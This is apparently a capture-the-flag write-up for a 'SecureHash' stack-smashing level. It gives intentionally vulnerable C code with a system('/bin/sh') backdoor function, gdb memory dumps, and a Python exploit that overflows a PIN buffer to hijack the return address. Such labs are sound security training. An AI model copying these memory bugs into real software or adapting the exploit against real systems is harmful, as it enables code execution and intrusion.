# Memory Corruption - Level 3

## Mission (SecureHash)

"We've found one of our adversaries using this software that allows them to scramble messages in a virtual notepad. They have a history of shoddy software development, so we're sure there's some subtle bugs hiding out in this code."


## Static Analysis


### C Source Code

```c
// gcc -g -no-pie -fno-stack-protector -I ../includes ./03_level_2.c -o 03_level_2
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Hidden for simplicity
#include "wargames.h"
#include "03_level_2.h"

//
// Globals
//

#define MAX_FIELD_LEN 32
#define BUFFER_SIZE 64

struct scratch_space {
    char notepad[BUFFER_SIZE];
    unsigned int pin_len;
} g_scratch_space;

//
// Code
//

// TODO: Give a shell to users with a special hash
void get_shell()
{
    system("/bin/sh");
}

void scramble()
{
    int i = 0;

    // Scramble the first name in the global notepad
    for (i = 0; g_scratch_space.notepad[i]; i++)
        g_scratch_space.notepad[i] ^= ((0x7 << i) & 0xff);

    // Tick past the null-delimiter ...
    i++;

    // Scramble the last name in global notepad
    while (g_scratch_space.notepad[i])
        g_scratch_space.notepad[i++] |= 0x42;
}

void mask_with_pin()
{
    char user_pin[MAX_FIELD_LEN];

    // Prompt the user for a PIN
    printf("Enter the PIN you wish to use: ");
    fgets(user_pin, g_scratch_space.pin_len, stdin);

    // Scramble the global notepad with the user's PIN
    for (unsigned int i = 0; i < BUFFER_SIZE; i++)
        g_scratch_space.notepad[i] ^= user_pin[i % g_scratch_space.pin_len];
}

void initialize_scratch_space()
{
    // Initialize the notepad to all zero bytes
    memset(g_scratch_space.notepad, 0, BUFFER_SIZE);

    if (!g_scratch_space.pin_len)
    {
        printf("Enter the size of the PIN you wish to use: ");
        g_scratch_space.pin_len = get_uint();
    }

    if (g_scratch_space.pin_len > MAX_FIELD_LEN - 1)
    {
        printf("[!!] PIN Size exceeds maximum value, quitting...");
        exit(1);
    }

}

void interface()
{
    char firstname[MAX_FIELD_LEN] = {};
    char lastname[MAX_FIELD_LEN] = {};
    char choice = 'y';

    unsigned int firstname_len = 0;
    unsigned int lastname_len = 0;

    // Initialize the scratchspace for the first time
    initialize_scratch_space();

    while (choice == 'y')
    {

        // Zero out our local buffers
        memset(firstname, 0, MAX_FIELD_LEN);
        memset(lastname, 0, MAX_FIELD_LEN);

        // Get the user's first and last name.
        printf("Enter your first name: ");
        fgets(firstname, MAX_FIELD_LEN, stdin);

        printf("Enter your last name: ");
        fgets(lastname, MAX_FIELD_LEN, stdin);

        // Get the length of the names
        firstname_len = strnlen(firstname, MAX_FIELD_LEN);
        lastname_len = strnlen(lastname, MAX_FIELD_LEN);

        // Copy their first name into the notepad
        memcpy(g_scratch_space.notepad, firstname, firstname_len);

        // Copy their last name into the notepad, placing it after the first name
        memcpy(&g_scratch_space.notepad[++firstname_len], lastname, lastname_len);

        // Scramble the input
        scramble();

        // Check if the user wants to further scramble their hash
        printf("Apply PIN Scrambling? [y/n] ");
        choice = get_char();

        // Apply final scramble (if applicable), and print the resulting hash
        if (choice == 'y')
        {
            mask_with_pin();
            print_hash(BUFFER_SIZE, g_scratch_space.notepad);
            initialize_scratch_space();
        }
        else if (choice == 'n')
        {
            print_hash(BUFFER_SIZE, g_scratch_space.notepad);
            initialize_scratch_space();
        }

        // Allow the user to stop generating hashes
        printf("Continue generating hashes? [y/n] ");
        choice = get_char();
    }
}

void main()
{
    init_wargame();

    printf("------------------------------------------------------------\n");
    printf("--[ Stack Smashing Level #3 - SecureHash                    \n");
    printf("------------------------------------------------------------\n");
    interface();

    // Exit the program / return from main
}

```



## Solving the Challenge


```gdb
Breakpoint 1: 0x400be7, mask_with_pin+47
wdb> x/12gx 0x602120
0x602120: 0x7f3f1f8fc7ff047e    0xffffffffffffffff
0x602130: 0xffffffffffffffff    0xffffffffffffffff
0x602140: 0x7f3f1f8fc7e304f8    0xffffffffffffffff
0x602150: 0xffffffffffffffff    0x00ffffffffffffff
0x602160: 0x000000000000005f    0x0000000000000000      # The pin length is now 0x5f or 95 decimal
0x602170: 0x0000000000000000    0x0000000000000000
wdb> x/12gx $rbp-0x50
0x7fffffffed10: 0x00007fffffffed90    0x00007f00005ec8e0
0x7fffffffed20: 0x0000000000000000    0x0000000000400bcf
0x7fffffffed30: 0x00007f00005ec8e0    0x0a007f000029e255
0x7fffffffed40: 0x00007fffffffed60    0x0000000000400a50
0x7fffffffed50: 0x0000000000000000    0x79000041ffffedc0
0x7fffffffed60: 0x00007fffffffedc0    0x0000000000400e0a
wdb> ni
0x400bec in mask_with_pin ()
wdb> x/12gx $rbp-0x50
0x7fffffffed10: 0x0000000000000000    0x00007fffffffed60
0x7fffffffed20: 0x00000000004008e0    0x0000000000400bec
0x7fffffffed30: 0x4141414141414141    0x4141414141414141
0x7fffffffed40: 0x4141414141414141    0x4141414141414141
0x7fffffffed50: 0x4141414141414141    0x4141414141414141
0x7fffffffed60: 0x4141414141414141    0x0000000000400b21
```



```python
import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
# data = p.readuntil('\n')
p.readuntil('Enter the size of the PIN you wish to use: ')
p.sendline('31')
p.readuntil('Enter your first name: ')
p.sendline('\xff' * 30 )
p.readuntil('Enter your last name: ')
p.sendline('\xff' * 31 )
p.readuntil('Apply PIN Scrambling? [y/n] ')
p.sendline('y')
# p.readuntil('Continue generating hashes? [y/n] ')
# p.sendline('y')

# Second Loop

p.readuntil('Enter your first name: ')
p.sendline('A')
p.readuntil('Enter your last name: ')
p.sendline('B' * 28  )
p.readuntil('Apply PIN Scrambling? [y/n] ')
p.sendline('y')
p.readuntil('Enter the PIN you wish to use: ')
p.sendline('A' * 56 + p64(0x400b21).decode('utf-8'))
```

